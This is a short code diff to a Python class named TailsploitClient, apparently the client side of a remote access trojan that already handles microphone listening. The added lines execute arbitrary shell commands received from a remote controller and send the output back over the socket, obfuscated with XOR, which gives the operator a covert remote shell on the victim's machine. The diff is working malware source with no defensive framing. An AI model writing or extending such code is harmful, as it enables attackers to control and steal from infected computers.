@@ -79,6 +79,15 @@ class TailsploitClient:
                         else:
                             print("[*] Microphone is not being listened to.")
 
+                    else:
+                        try:
+                            output = subprocess.check_output(commandDecode, shell=True, stderr=subprocess.STDOUT, text=True)
+                            client_socket.send(handleXOREncryption(output.encode("utf-8"), TRAFFIC_ENCRYPTION_TOKEN))
+                        except subprocess.CalledProcessError as e:
+                            error_message = f"Error executing command: {e.output}"
+                            client_socket.send(handleXOREncryption(error_message.encode("utf-8"), TRAFFIC_ENCRYPTION_TOKEN))
+
+
         except:
             print("Rtrying...")
             time.sleep(5)
